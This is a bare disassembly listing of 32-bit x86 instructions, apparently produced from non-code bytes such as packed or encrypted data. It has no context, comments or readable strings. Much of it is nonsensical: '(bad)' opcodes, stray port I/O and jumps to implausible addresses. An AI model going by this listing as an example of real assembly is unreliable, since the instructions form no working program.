  41c29c:	xchg   edi,eax
  41c29d:	out    0x8f,al
  41c29f:	ja     0x41c255
  41c2a1:	jmp    0x41c242
  41c2a3:	or     DWORD PTR [esi],ebp
  41c2a5:	sub    al,0xf7
  41c2a7:	test   dh,ah
  41c2a9:	clc    
  41c2aa:	dec    ecx
  41c2ab:	sbb    ebx,DWORD PTR [ebx]
  41c2ad:	pop    ecx
  41c2ae:	cmp    eax,0xb06bf905
  41c2b3:	add    DWORD PTR [ebp-0x30],edi
  41c2b6:	add    esp,esp
  41c2b8:	or     DWORD PTR [edi+0xd095997],0xa7b94d0
  41c2c2:	sub    BYTE PTR [ecx+0x7e77f1a0],ah
  41c2c8:	(bad)  
  41c2ca:	nop
  41c2cb:	int    0xd5
  41c2cd:	push   0x9b1cb46c
  41c2d2:	add    DWORD PTR [esi+0x62],0x6d
  41c2d6:	nop
  41c2d7:	add    ah,BYTE PTR [eax+edx*2+0x709fd724]
  41c2de:	pop    ss
  41c2df:	test   BYTE PTR [ebp-0x168ef6a],dl
  41c2e5:	lea    ebx,[esi-0x40]
  41c2e8:	or     al,0x21
  41c2ea:	lahf   
  41c2eb:	repz rcr BYTE PTR [edi-0x72],1
  41c2ef:	or     ch,cl
  41c2f1:	xor    bl,ch
  41c2f3:	test   BYTE PTR [edi-0x3],ah
  41c2f6:	xor    ecx,edx
  41c2f8:	popa   
  41c2f9:	push   ds
  41c2fa:	mov    ebp,DWORD PTR [esi-0x17df695c]
  41c300:	mov    ecx,0x9e2bd55f
  41c305:	fdiv   DWORD PTR [bp+di-0x2a48]
  41c30a:	daa    
  41c30b:	dec    esi
  41c30c:	push   ebx
  41c30d:	fisubr WORD PTR [ebx+0x226d5594]
  41c313:	pop    ecx
  41c314:	mov    ebp,0x78028fe2
  41c319:	mov    eax,ds:0x5cbb5f12
  41c31e:	in     eax,0x49
  41c320:	mov    dl,al
  41c322:	div    BYTE PTR [esi]
  41c324:	dec    esp
  41c325:	push   esp
  41c326:	push   eax
  41c327:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c328:	fwait
  41c329:	aam    0x29
  41c32b:	add    al,0x3a
  41c32d:	jle    0x41c31e
  41c32f:	mov    al,0x4d
  41c331:	fiadd  WORD PTR [ebx-0x1d7cfcd3]
  41c337:	pushf  
  41c338:	in     al,0xe0
  41c33a:	jns    0x41c30d
  41c33c:	fwait
  41c33d:	ss inc eax
  41c33f:	push   edx
  41c340:	stos   DWORD PTR es:[edi],eax
  41c341:	mov    ebx,0xde5c5936
  41c346:	adc    eax,0xfbdf4e67
  41c34b:	(bad)  
  41c34c:	mov    bl,0x1d
  41c34e:	nop
  41c34f:	add    edi,DWORD PTR [esi]
  41c351:	push   eax
  41c352:	test   eax,0x75192271
  41c357:	pop    eax
  41c358:	and    al,0xa3
  41c35a:	stos   DWORD PTR es:[edi],eax
  41c35b:	das    
  41c35c:	inc    esi
  41c35d:	loopne 0x41c2ee
  41c35f:	jnp    0x41c3d8
  41c361:	out    0xc9,eax
  41c363:	iret   
  41c364:	xchg   DWORD PTR [edx-0x70],ebx
  41c367:	cld    
  41c368:	mov    eax,ds:0x52bee639
  41c36d:	xor    DWORD PTR [ebp+0x4a],edx
  41c370:	add    BYTE PTR [ebx],bl
  41c372:	cwde   
  41c373:	jbe    0x41c35d
  41c375:	test   eax,0xa69b3a22
  41c37a:	mov    eax,ds:0x67d0d3c9
  41c37f:	sbb    eax,0x6007c02e
  41c384:	stos   DWORD PTR es:[edi],eax
  41c385:	cmc    
  41c386:	mov    edx,0x2258e84c
  41c38b:	mov    eax,0xaac5753
  41c390:	fwait
  41c391:	pop    ds
  41c392:	push   es
  41c393:	js     0x41c3ce
  41c395:	sti    
  41c396:	pop    ds
  41c397:	ins    DWORD PTR es:[edi],dx
  41c398:	lods   al,BYTE PTR ds:[esi]
  41c399:	(bad)  
  41c39b:	mov    dh,0x53
  41c39d:	jp     0x41c3c5
  41c39f:	cs sbb al,0xd4
  41c3a2:	pop    es
  41c3a3:	jae    0x41c340
  41c3a5:	popf   
  41c3a6:	iret   
  41c3a7:	jae    0x41c3f9
  41c3a9:	or     eax,0xdd9d1bf0
  41c3ae:	ss leave 
  41c3b0:	test   eax,0x70542f9b
  41c3b5:	icebp  
  41c3b6:	lods   eax,DWORD PTR ds:[esi]
  41c3b7:	push   eax
  41c3b8:	ret    
  41c3b9:	push   ebx
  41c3ba:	push   eax
  41c3bb:	pushf  
  41c3bc:	mov    dh,BYTE PTR [eax-0xa]
  41c3bf:	sub    DWORD PTR [edi-0x3e536022],eax
  41c3c5:	add    al,0xf9
  41c3c7:	mov    bh,0x6b
  41c3c9:	xchg   ebp,eax
  41c3ca:	nop
  41c3cb:	in     eax,0xdb
  41c3cd:	xchg   esi,eax
  41c3ce:	out    dx,eax
  41c3cf:	ret    
  41c3d0:	pop    esi
  41c3d1:	stos   DWORD PTR es:[edi],eax
  41c3d2:	sub    eax,0xeb77954a
  41c3d7:	call   0x82691038
  41c3dc:	mov    ds:0xf14544e3,al
  41c3e1:	xchg   dl,cl
  41c3e3:	cmp    al,0x9b
  41c3e5:	std    
  41c3e6:	sub    edi,DWORD PTR [esi+0xd]
  41c3e9:	out    dx,eax
  41c3ea:	ins    DWORD PTR es:[edi],dx
  41c3eb:	dec    edx
  41c3ec:	add    al,0xf7
  41c3ee:	mov    eax,ds:0x7e91da10
  41c3f3:	dec    ecx
  41c3f4:	out    0x1e,eax
  41c3f6:	pop    ecx
  41c3f7:	xchg   BYTE PTR [ebx-0x2c422522],ch
  41c3fd:	dec    BYTE PTR [ecx-0xe]
  41c400:	retf   
  41c401:	sub    ch,ch
  41c403:	dec    esp
  41c404:	adc    edi,DWORD PTR [edx+0x1f]
  41c407:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c408:	xchg   esp,esp
  41c40a:	xchg   DWORD PTR [edi+edi*4-0x67086f70],ebp
  41c411:	mov    dl,0xa1
  41c413:	(bad)  [edx+edx*2]
  41c416:	(bad)  
  41c417:	dec    ecx
  41c418:	rcl    ebx,1
  41c41a:	shl    BYTE PTR [ecx+0x3a],0x11
  41c41e:	mov    esi,0xeecba284
  41c423:	mov    cl,0xe
  41c425:	pop    ebp
  41c426:	jo     0x41c42a
  41c428:	jbe    0x41c3b3
  41c42a:	xor    ebp,DWORD PTR [edi+0x4c]
  41c42d:	sub    dl,al
  41c42f:	cmc    
  41c430:	add    dh,BYTE PTR [ecx-0x70]
  41c433:	jl     0x41c496
  41c435:	or     DWORD PTR ds:0x8750c85a,ebp
  41c43b:	dec    edx
  41c43c:	test   BYTE PTR [ebx+ebp*4-0x40c8214e],al
  41c443:	and    BYTE PTR [ebx-0x3dc1cac5],bl
  41c449:	stos   BYTE PTR es:[edi],al
  41c44a:	push   ds
  41c44b:	sub    DWORD PTR [eax+0x6bf77fdd],0x5fa78101
  41c455:	and    al,0x5
  41c457:	setnp  bh
  41c45a:	and    ebp,DWORD PTR [edx+0x48d404e2]
  41c460:	jmp    0x544a1042
  41c465:	fcmove st,st(1)
  41c467:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c468:	jecxz  0x41c428
  41c46a:	nop
  41c46b:	adc    DWORD PTR [ebx+0x21],ecx
  41c46e:	mov    ecx,0xbdc56cb5
  41c473:	dec    ecx
  41c474:	pushf  
  41c475:	hlt    
  41c476:	cli    
  41c477:	test   al,0xa0
  41c479:	mov    cl,0xc3
  41c47b:	pop    esi
  41c47c:	fwait
  41c47d:	mov    esp,ebx
  41c47f:	jecxz  0x41c4a8
  41c481:	lods   eax,DWORD PTR ds:[esi]
  41c482:	test   al,0xd4
  41c484:	rcr    ch,cl
  41c486:	xchg   BYTE PTR [esi-0x16],dl
  41c489:	int    0xbd
  41c48b:	fmul   DWORD PTR ds:0xbba29090
  41c491:	dec    ecx
  41c492:	mov    cl,0x4d
  41c494:	sbb    al,0xa2
  41c496:	pop    edx
  41c497:	dec    edx
  41c498:	iret   
  41c499:	out    dx,eax
  41c49a:	pushf  
  41c49b:	into   
  41c49c:	sbb    bh,BYTE PTR [edi*8+0x34659b9a]
  41c4a3:	out    0xee,eax
  41c4a5:	cli    
  41c4a6:	stos   BYTE PTR es:[edi],al
  41c4a7:	out    dx,al
  41c4a8:	xchg   ebp,eax
  41c4a9:	fild   WORD PTR [ecx]
  41c4ab:	cmova  edx,DWORD PTR [edi+0x491f3781]
  41c4b2:	nop
  41c4b3:	jle    0x41c4ef
  41c4b5:	outs   dx,BYTE PTR ds:[esi]
  41c4b6:	(bad)  
  41c4b7:	xchg   ecx,eax
  41c4b8:	inc    ebp
  41c4b9:	fidiv  WORD PTR [eax+0x9]
  41c4bc:	fmul   st,st(5)
  41c4be:	test   eax,0x8fefe4df
  41c4c3:	leave  
  41c4c4:	dec    ecx
  41c4c5:	mov    ds:0xa1a821f0,eax
  41c4cb:	dec    ecx
  41c4cc:	jbe    0x41c46b
  41c4ce:	push   ds
  41c4cf:	sar    DWORD PTR [edi-0x64baa807],1
  41c4d5:	pusha  
  41c4d6:	cld    
  41c4d7:	ss (bad) 
  41c4d9:	rcl    cl,cl
  41c4db:	arpl   WORD PTR [ecx+eiz*8-0xd],sp
  41c4df:	leave  
  41c4e0:	gs fwait
  41c4e2:	inc    esp
  41c4e3:	dec    ecx
  41c4e4:	jge    0x41c4f8
  41c4e6:	outs   dx,DWORD PTR ds:[esi]
  41c4e7:	dec    edx
  41c4e8:	shl    dl,1
  41c4ea:	mov    ebp,0x726dcd4f
  41c4ef:	dec    edx
  41c4f0:	shl    al,cl
  41c4f2:	pop    ds
  41c4f3:	aam    0x38
  41c4f5:	ucomiss xmm3,DWORD PTR [ebx+ebx*4-0x32]
  41c4fa:	in     al,0xa1
  41c4fc:	dec    ebx
  41c4fd:	jmp    0xfa07cbdf
  41c502:	sub    DWORD PTR [ebx],0xecaa615e
  41c508:	vxorps ymm7,ymm0,YMMWORD PTR [esi+0x39]
  41c50d:	adc    edx,DWORD PTR [eax-0x71937cf2]
  41c513:	push   edx
  41c514:	mov    eax,0x4050a93d
  41c519:	push   ds
  41c51a:	mov    ebp,0xf8cc611
  41c51f:	retf   0x81d1
  41c522:	mov    al,ds:0x909bd59a
  41c527:	xchg   edi,eax
  41c528:	pop    es
  41c529:	jmp    0x39c7:0x5fbfb44a
  41c530:	pandn  mm4,QWORD PTR [edx+0x3e45453c]
  41c537:	cdq    
  41c538:	pusha  
  41c539:	dec    edi
  41c53a:	xchg   ebp,eax
  41c53b:	xor    DWORD PTR [esp+eiz*4+0x6d216190],esp
  41c542:	scas   eax,DWORD PTR es:[edi]
  41c543:	adc    ecx,DWORD PTR [ecx+0x674a57e9]
  41c549:	test   DWORD PTR [edx-0x359eb8d1],eax
  41c54f:	out    dx,eax
  41c550:	aam    0xdb
  41c552:	dec    BYTE PTR [ecx+0x13]
  41c555:	jb     0x41c57c
  41c557:	in     al,dx
  41c558:	mov    esi,0x69327348
  41c55d:	fdivrp st(4),st
  41c55f:	test   eax,0x447d5462
  41c564:	push   0xf2998ffe
  41c569:	pusha  
  41c56a:	fsub   QWORD PTR [edx]
  41c56c:	pop    eax
  41c56d:	mov    esp,eax
  41c56f:	push   eax
  41c570:	mov    edi,0xca3d510b
  41c575:	std    
  41c576:	inc    eax
  41c577:	or     eax,0xcb9026e6
  41c57c:	mov    dl,0x4f
  41c57e:	jns    0x41c5fa
  41c580:	mov    bl,BYTE PTR [edx]
  41c582:	test   BYTE PTR [edx+0x52],cl
  41c585:	jo     0x41c5de
  41c587:	push   ss
  41c588:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c589:	jb     0x41c5a1
  41c58b:	bound  ebx,QWORD PTR [ebx+0x8059d65]
  41c591:	mov    ch,0x69
  41c593:	ror    ch,0xdd
  41c596:	xchg   esp,eax
  41c597:	sbb    esp,DWORD PTR ds:0x47d25f2
  41c59d:	fbld   TBYTE PTR [edi]
  41c59f:	pop    esp
  41c5a0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c5a1:	leave  
  41c5a2:	mov    ebx,0xddde6499
  41c5a7:	dec    edi
  41c5a8:	jno    0x41c627
  41c5aa:	dec    esp
  41c5ab:	dec    ebp
  41c5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c5ad:	ss loope 0x41c550
  41c5b0:	pusha  
  41c5b1:	xchg   BYTE PTR [eax],dl
  41c5b3:	fistp  DWORD PTR ss:[ecx+edx*4]
  41c5b7:	cmp    dl,BYTE PTR [ebx+0x5c734dbd]
  41c5bd:	adc    DWORD PTR [eax],edx
  41c5bf:	add    al,bh
  41c5c1:	aam    0x74
  41c5c3:	fwait
  41c5c4:	stos   DWORD PTR es:[edi],eax
  41c5c5:	sub    edx,DWORD PTR [eax-0x5cd4db3e]
  41c5cb:	sub    edx,ebp
  41c5cd:	inc    esp
  41c5ce:	mov    dl,al
  41c5d0:	stc    
  41c5d1:	ffree  st(5)
  41c5d3:	mov    DWORD PTR [ebx],0x6045ecb3
  41c5d9:	cmp    edx,DWORD PTR [edi+0x5383fc2]
  41c5df:	(bad)  
  41c5e0:	sbb    edi,DWORD PTR [ecx+edx*2-0x13]
  41c5e4:	stos   BYTE PTR es:[edi],al
  41c5e5:	push   ss
  41c5e6:	jl     0x41c5e1
  41c5e8:	popf   
  41c5e9:	retf   
  41c5ea:	add    BYTE PTR [eax+ebp*1],cl
  41c5ed:	das    
  41c5ee:	jo     0x41c601
  41c5f0:	mov    ch,0xa7
  41c5f2:	sahf   
  41c5f3:	xchg   ah,bl
  41c5f5:	xchg   edi,eax
  41c5f6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c5f7:	imul   edi,DWORD PTR [ebp+0x2e],0xde797fab
  41c5fe:	lea    ebx,[eax+esi*1+0x1e8d0b9]
  41c605:	pushf  
  41c606:	nop
  41c607:	and    eax,esi
  41c609:	jmp    0x41c60e
  41c60b:	lea    esi,[edi+eax*8]
  41c60e:	xor    eax,esi
  41c610:	push   eax
  41c611:	fmulp  st(2),st
  41c613:	mov    cl,ah
  41c615:	mov    esp,0x5a7e8bff
  41c61a:	nop
  41c61b:	dec    ebp
  41c61c:	inc    esi
  41c61d:	xor    BYTE PTR [esi-0x16],ch
  41c620:	loop   0x41c5fc
  41c622:	stc    
  41c623:	mov    ebp,0xdd58e366
  41c628:	rcl    BYTE PTR [edi+0x4b8f0b66],1
  41c62e:	ss sub edx,esi
  41c631:	std    
  41c632:	add    BYTE PTR [esi],dh
  41c634:	fwait
  41c635:	xor    BYTE PTR [ebp+0x6764eb17],dh
  41c63b:	sub    esi,eax
  41c63d:	(bad)  [eax-0x24]
  41c640:	rcr    BYTE PTR [esi-0x73],cl
  41c643:	or     al,BYTE PTR [ecx]
  41c645:	icebp  
  41c646:	jns    0x41c67e
  41c648:	cld    
  41c649:	in     eax,0xff
  41c64b:	sbb    eax,0x12b05c58
  41c650:	xchg   esi,eax
  41c651:	(bad)  
  41c652:	hlt    
  41c653:	dec    ecx
  41c654:	push   ebx
  41c655:	mov    ch,0x15
  41c657:	test   BYTE PTR [esi],0x9e
  41c65a:	mov    ah,0x8
  41c65c:	fwait
  41c65d:	pop    ss
  41c65e:	loopne 0x41c698
  41c660:	sti    
  41c661:	imul   DWORD PTR [esi-0x1f2166ca]
  41c667:	mov    eax,ds:0x58d88037
  41c66c:	xor    ebx,DWORD PTR [eax+edx*4-0x6a54d560]
  41c673:	(bad)  [ebx+ecx*1]
  41c676:	popa   
  41c677:	dec    edx
  41c678:	es inc edi
  41c67a:	int    0xc9
  41c67c:	push   edx
  41c67d:	push   esp
  41c67e:	jmp    0x41c6e4
  41c680:	fwait
  41c681:	dec    ecx
  41c682:	ss cmp eax,0x75c0baf4
  41c688:	jge    0x41c66b
  41c68a:	push   es
  41c68b:	test   ebp,ecx
  41c68d:	pusha  
  41c68e:	push   esi
  41c68f:	ror    DWORD PTR [ebx+0x5c],cl
  41c692:	enter  0x97ae,0x9d
  41c696:	nop
  41c697:	dec    edi
  41c698:	jns    0x41c67d
  41c69a:	addr16 sti 
  41c69c:	stc    
  41c69d:	jmp    0xd64e10d4
  41c6a2:	(bad)  
  41c6a3:	mov    edi,0xaea126ad
  41c6a8:	fwait
  41c6a9:	ja     0x41c642
  41c6ab:	repnz imul edx,DWORD PTR [eax+eiz*1+0x68de8cfc],0xffffffe9
  41c6b4:	add    BYTE PTR [eax+ebx*4],0x7d
  41c6b8:	scas   eax,DWORD PTR es:[edi]
  41c6b9:	adc    BYTE PTR [eax-0x417f9ad5],0xf4
  41c6c0:	ins    BYTE PTR es:[edi],dx
  41c6c1:	push   ss
  41c6c2:	pop    esi
  41c6c3:	dec    edx
  41c6c4:	mov    cs,WORD PTR [edi+0x3c]
  41c6c7:	lock jecxz 0x41c6bc
  41c6ca:	and    esi,0x22db609b
  41c6d0:	cdq    
  41c6d1:	outs   dx,DWORD PTR ds:[esi]
  41c6d2:	add    esp,DWORD PTR cs:[esi-0x2d957823]
  41c6d9:	fwait
  41c6da:	ret    
  41c6db:	push   ebx
  41c6dc:	push   edi
  41c6dd:	mov    esi,0xf4dcd0b6
  41c6e2:	lods   eax,DWORD PTR ds:[esi]
  41c6e3:	xor    BYTE PTR [ebx-0x210f47ea],bl
  41c6e9:	adc    bh,BYTE PTR [edx+ecx*2+0x2c]
  41c6ed:	aas    
  41c6ee:	push   ecx
  41c6ef:	sub    eax,0xc19c7816
  41c6f4:	fwait
  41c6f5:	cdq    
  41c6f6:	ret    
  41c6f7:	adc    esi,edi
  41c6f9:	or     edx,DWORD PTR [eax-0x13]
  41c6fc:	fisttp QWORD PTR [ebx]
  41c6fe:	inc    ebx
  41c6ff:	dec    ebp
  41c700:	sbb    dh,0x6f
  41c703:	iret   
  41c704:	nop
  41c705:	pop    ebx
  41c706:	sbb    edx,DWORD PTR [esi-0x18264165]
  41c70c:	in     eax,0x0
  41c70e:	mov    dh,0xcd
  41c710:	(bad)  
  41c711:	fstp   QWORD PTR [esi+esi*8]
  41c714:	push   0xb2ef1930
  41c719:	dec    DWORD PTR [edi-0x7c85ef9f]
  41c71f:	(bad)  
  41c720:	sub    ebp,0xc0fa4a23
  41c726:	and    BYTE PTR [ebp+0x7063b2c6],al
  41c72c:	fwait
  41c72d:	jl     0x41c78b
  41c72f:	fistp  DWORD PTR [eax-0x5b]
  41c732:	jbe    0x41c6fa
  41c734:	mov    ds:0x1367048d,eax
  41c739:	xor    BYTE PTR [ecx-0x2390db6],al
  41c73f:	push   cs
  41c740:	into   
  41c741:	mov    eax,0x46806990
  41c746:	loopne 0x41c6ed
  41c748:	iret   
  41c749:	es push ebx
  41c74b:	dec    edx
  41c74c:	int3   
  41c74d:	leave  
  41c74e:	(bad)  [edi-0x64760a38]
  41c754:	sahf   
  41c755:	xchg   esp,eax
  41c756:	lock cld 
  41c758:	adc    al,0x9f
  41c75a:	sub    dl,0xf2
  41c75d:	sub    eax,0xef1760d3
  41c762:	fisttp QWORD PTR [ecx+0x54]
  41c765:	ror    DWORD PTR [ebx-0x6f4cccd8],1
  41c76b:	fistp  WORD PTR [edx-0x4900e574]
  41c771:	dec    edx
  41c772:	pop    cx
  41c774:	and    eax,DWORD PTR [eax-0x7a]
  41c777:	push   ds
  41c778:	mov    ds:0x743a7a3a,al
  41c77d:	mov    dh,0xcc
  41c77f:	scas   eax,DWORD PTR es:[edi]
  41c780:	mov    eax,ds:0x886c1feb
  41c785:	add    ebx,DWORD PTR [eax-0x5e]
  41c788:	mov    eax,0x45b592fe
  41c78d:	xchg   DWORD PTR [edi+eiz*1+0x5c75e953],ebp
  41c794:	fwait
  41c795:	imul   ecx,DWORD PTR [esi-0x7da9444],0xc74f3862
  41c79f:	stc    
  41c7a0:	jmp    0x41c77f
  41c7a2:	pop    esp
  41c7a3:	imul   DWORD PTR ss:[edx+eax*8-0x6f6e82a9]
  41c7ab:	mov    edx,0x819efafb
  41c7b0:	ja     0x41c77f
  41c7b2:	call   0x3e28200
  41c7b7:	mov    eax,esi
  41c7b9:	loopne 0x41c800
  41c7bb:	xor    al,0x9b
  41c7bd:	pushf  
  41c7be:	frstor [edi+edx*2]
  41c7c1:	lock pop ecx
  41c7c3:	xchg   ecx,eax
  41c7c4:	xor    ebx,esi
  41c7c6:	mov    esi,0x61ce5561
  41c7cb:	imul   DWORD PTR [esi+ebp*1]
  41c7ce:	lahf   
  41c7cf:	or     eax,0x9c718a7
  41c7d4:	mov    ch,0x1c
  41c7d6:	(bad)  
  41c7d7:	mov    esp,0x683fde19
  41c7dc:	nop
  41c7dd:	adc    BYTE PTR [esi-0x40],0x39
  41c7e1:	pop    ebx
  41c7e2:	nop
  41c7e3:	xchg   edi,eax
  41c7e4:	ins    DWORD PTR es:[edi],dx
  41c7e5:	and    eax,0xc49810b8
  41c7ea:	add    DWORD PTR [edx+0x1e],ecx
  41c7ed:	out    0xb9,al
  41c7ef:	dec    esi
  41c7f0:	add    DWORD PTR [ebp+0x75],ebp
  41c7f3:	jge    0x41c790
  41c7f5:	(bad)  
  41c7f6:	xor    cl,BYTE PTR [esi]
  41c7f8:	retf   
  41c7f9:	cwde   
  41c7fa:	aas    
  41c7fb:	test   BYTE PTR [edi+0x446885da],cl
  41c801:	pop    edx
  41c802:	push   esi
  41c803:	or     dh,cl
  41c805:	xchg   ebp,eax
  41c806:	sbb    DWORD PTR [edi+esi*4],ebx
  41c809:	retf   0x1097
  41c80c:	inc    edi
  41c80d:	cmc    
  41c80e:	xchg   esi,eax
  41c80f:	daa    
  41c810:	add    cl,BYTE PTR [eax+0x3f05cef0]
  41c816:	mov    esi,0x27192c49
  41c81b:	rcr    DWORD PTR [ebp-0x633c741d],cl
  41c821:	mov    ds:0x208dad53,al
  41c826:	mov    dl,0xde
  41c828:	(bad)  
  41c829:	retf   
  41c82a:	fisttp WORD PTR [ecx-0x72]
  41c82d:	(bad)  
  41c82e:	xor    DWORD PTR ds:0xc621d654,edx
  41c834:	or     esi,0xa50f6e90
  41c83a:	popa   
  41c83b:	jecxz  0x41c89b
  41c83d:	mov    ds:0xf054d13,eax
  41c842:	xchg   esp,eax
  41c843:	and    BYTE PTR [edi+0x42],dh
  41c846:	pop    eax
  41c847:	loope  0x41c7d0
  41c849:	adc    DWORD PTR [esi+0x6282a2c7],ebx
  41c84f:	imul   ebx,DWORD PTR [ebx-0x20],0xd848330c
  41c856:	push   es
  41c857:	dec    edx
  41c858:	shr    ch,0x4f
  41c85b:	cmp    BYTE PTR [esi+0xb],dh
  41c85e:	adc    eax,0xae4e8bde
  41c863:	jne    0x41c8d6
  41c865:	imul   ebx,edi,0x74fdbcbd
  41c86b:	mov    esp,0x4d32dd99
  41c870:	fs or  eax,0x5b63a61c
  41c876:	inc    eax
  41c877:	popa   
  41c878:	outs   dx,DWORD PTR ds:[esi]
  41c879:	mov    ebx,0xfcec3c90
  41c87e:	fldenv [edx+ebp*4+0x59]
  41c882:	push   ebx
  41c883:	mov    ebx,0x5634de62
  41c888:	nop
  41c889:	loopne 0x41c8fe
  41c88b:	cdq    
  41c88c:	scas   eax,DWORD PTR es:[edi]
  41c88d:	dec    eax
  41c88e:	nop
  41c88f:	push   0xe63057
  41c894:	outs   dx,BYTE PTR ds:[esi]
  41c895:	lea    ebp,[edx]
  41c897:	dec    edx
  41c898:	add    dh,bl
  41c89a:	dec    edx
  41c89b:	xchg   ebp,eax
  41c89c:	repz push 0xede70d7c
  41c8a2:	loopne 0x41c8ed
  41c8a4:	xor    al,0x12
  41c8a6:	mov    esi,0x2a5e9836
  41c8ab:	mov    ds:0xbdae6d32,al
  41c8b0:	out    dx,al
  41c8b1:	pop    ebp
  41c8b2:	bound  esp,QWORD PTR [eax]
  41c8b4:	stos   BYTE PTR es:[edi],al
  41c8b5:	clc    
  41c8b6:	inc    ecx
  41c8b7:	cmp    al,0x1a
  41c8b9:	jecxz  0x41c863
  41c8bb:	inc    esi
  41c8bc:	(bad)  
  41c8bd:	mov    ecx,0x985bd008
  41c8c2:	(bad)  
  41c8c3:	dec    ecx
  41c8c4:	popa   
  41c8c5:	out    dx,eax
  41c8c6:	outs   dx,BYTE PTR ds:[esi]
  41c8c7:	mov    WORD PTR [esi-0x2c714af9],fs
  41c8cd:	or     al,0xe7
  41c8cf:	dec    ecx
  41c8d0:	daa    
  41c8d1:	or     bh,BYTE PTR [eax-0x66]
  41c8d4:	mov    ebx,0x8b49bda0
  41c8d9:	fistp  DWORD PTR [ecx]
  41c8db:	xlat   BYTE PTR ds:[ebx]
  41c8dc:	nop
  41c8dd:	sbb    eax,0x899b2155
  41c8e2:	push   edi
  41c8e3:	pop    esp
  41c8e4:	sar    BYTE PTR [edx-0x52],0xf6
  41c8e8:	(bad)  
  41c8ea:	xor    BYTE PTR [ebp+0x43c91a04],al
  41c8f0:	ins    BYTE PTR es:[edi],dx
  41c8f1:	stos   BYTE PTR es:[edi],al
  41c8f2:	or     edx,eax
  41c8f4:	lahf   
  41c8f5:	sbb    BYTE PTR [esi],0x2c
  41c8f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c8f9:	push   esp
  41c8fa:	push   eax
  41c8fb:	in     al,0x3f
  41c8fd:	dec    ecx
  41c8fe:	mov    ebp,0x487b0a49
  41c903:	fstp   TBYTE PTR [eax-0x76]
  41c906:	push   ss
  41c907:	(bad)  
  41c908:	fwait
  41c909:	xor    eax,0x449e39d0
  41c90e:	mov    ebx,0xa2eccec4
  41c913:	aaa    
  41c914:	neg    DWORD PTR [ecx]
  41c916:	hlt    
  41c917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c918:	mov    bh,0xa0
  41c91a:	push   0x1e245301
  41c91f:	jg     0x41c8bc
  41c921:	push   esp
  41c922:	dec    ebp
  41c924:	push   es
  41c925:	retf   
  41c926:	and    DWORD PTR [edi+0x64],ebp
  41c929:	fisubr WORD PTR [ecx]
  41c92b:	cmp    ebx,DWORD PTR [ebx+0x63]
  41c92e:	je     0x41c958
  41c930:	dec    edx
  41c931:	fcom   DWORD PTR [eax-0x4bb8d1b9]
  41c937:	mov    DWORD PTR [ebx-0x53],ebp
  41c93a:	hlt    
  41c93b:	dec    ecx
  41c93c:	jno    0x41c9a9
  41c93e:	(bad)  
  41c93f:	call   0x710cf6a8
  41c944:	pushf  
  41c945:	inc    ebp
  41c946:	xor    bl,bh
  41c948:	loopne 0x41c988
  41c94a:	mov    ebx,eax
  41c94c:	arpl   di,sp
  41c94e:	dec    esi
  41c94f:	dec    edx
  41c950:	mov    eax,0xe8ee9c94
  41c955:	mov    eax,ds:0xe2b8d7cc
  41c95a:	rcl    BYTE PTR [edi+0x515ee0db],1
  41c960:	push   0x594e484f
  41c965:	push   ebp
  41c966:	mov    cl,0x39
  41c968:	(bad)  
  41c969:	popf   
  41c96a:	in     al,0xaa
  41c96c:	or     ecx,ecx
  41c96e:	call   0x41215dc8
  41c973:	retf   0xe656
  41c976:	jbe    0x41c991
  41c978:	ja     0x41c9d5
  41c97a:	lahf   
  41c97b:	inc    ebx
  41c97c:	lods   eax,DWORD PTR ds:[esi]
  41c97d:	fst    QWORD PTR [ebx+0x731abb43]
  41c983:	into   
  41c984:	repz jae 0x41c98f
  41c987:	loop   0x41c924
  41c989:	pop    ecx
  41c98a:	mov    dl,0x30
  41c98c:	add    al,0xea
  41c98e:	or     DWORD PTR [eax+0x7231162d],esp
  41c994:	sbb    edi,DWORD PTR ds:0xe14f9c8c
  41c99a:	mov    ds:0x6c30d481,al
  41c99f:	dec    edx
  41c9a0:	sub    al,0x23
  41c9a2:	push   ds
  41c9a3:	(bad)  
  41c9a4:	jcxz   0x41c9dd
  41c9a7:	dec    edx
  41c9a8:	adc    bh,BYTE PTR ds:0x750bd4f0
  41c9ae:	cmovno ebx,ecx
  41c9b1:	mov    ebx,0xb72c49ee
  41c9b6:	std    
  41c9b7:	shl    ecx,cl
  41c9b9:	cli    
  41c9ba:	dec    ebp
  41c9bb:	dec    edx
  41c9bc:	sti    
  41c9bd:	sub    ecx,DWORD PTR [eax-0x7edb224c]
  41c9c3:	daa    
  41c9c4:	call   0xccc0:0xd56041ce
  41c9cb:	dec    edx
  41c9cc:	and    eax,0xbf22471e
  41c9d1:	sub    al,0x78
  41c9d3:	out    dx,al
  41c9d4:	test   esi,ebx
  41c9d6:	add    DWORD PTR [edi+0x7a],esp
  41c9d9:	lea    esi,[ebx]
  41c9db:	add    dh,0x23
  41c9de:	nop
  41c9df:	ja     0x41c967
  41c9e1:	dec    ecx
  41c9e2:	xor    eax,0xd8bde63c
  41c9e7:	push   edi
  41c9e8:	sar    BYTE PTR [eax+0x5bffdf],1
  41c9ee:	add    BYTE PTR [edx-0x76],0x98
  41c9f2:	xchg   ecx,eax
  41c9f3:	add    dl,BYTE PTR [eax]
  41c9f5:	mov    bl,dh
  41c9f7:	push   eax
  41c9f8:	in     eax,dx
  41c9f9:	cdq    
  41c9fa:	pop    esp
  41c9fb:	adc    edx,edx
  41c9fd:	fstp   QWORD PTR [ebx+0x1c]
  41ca00:	out    0x65,al
  41ca02:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ca03:	mov    eax,0xd5904c20
  41ca08:	cs mov cl,0x53
  41ca0b:	jmp    0x8578139c
  41ca10:	arpl   WORD PTR [ebp-0x67],bx
  41ca13:	sbb    eax,0x87900364
  41ca18:	(bad)  
  41ca19:	pop    ebx
  41ca1a:	xchg   esi,eax
  41ca1b:	gs fwait
  41ca1d:	popa   
  41ca1e:	outs   dx,DWORD PTR ds:[esi]
  41ca1f:	icebp  
  41ca20:	ret    
  41ca21:	scas   al,BYTE PTR es:[edi]
  41ca22:	cli    
  41ca23:	push   esp
